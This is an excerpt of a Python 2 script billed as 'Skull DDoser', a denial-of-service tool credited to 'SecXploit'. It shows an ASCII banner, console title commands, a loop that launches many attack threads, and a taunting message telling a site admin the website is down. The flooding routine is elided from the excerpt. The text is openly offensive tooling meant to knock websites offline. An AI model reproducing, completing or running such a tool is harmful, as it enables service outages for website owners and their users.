...
4$$$$$P           ^$$$$^          $$$$$$
 "*$$$"                           ^$$PP\n
               Skull DDoser 
   DDOS tools created by : Ph.Hitachi
"""
if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: DDOS TOOL BY SecXploit  :::::........')
    os.system('color 0c')
...
for x in xrange(thread):
    attacco().start()
    time.sleep(0.003)
    print "HMT2k1 attack started Sended =  " + str(x) + "!"
   
    print("####################################################")
    print("#           SEND TO ADMIN MESSAGE                  #")
    print("#Message : >Hey Admin !                            #")
    print("#          >YOUR WEBSITE HAS TEMPORATY DOWN!       #")
    print("#          >BY Security Xploit Attacker!           #")
    print("----------------------------------------------------")
    print '####################################################'
if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: SENDING SEQUEST :::::........')
    os.system('color 0e')
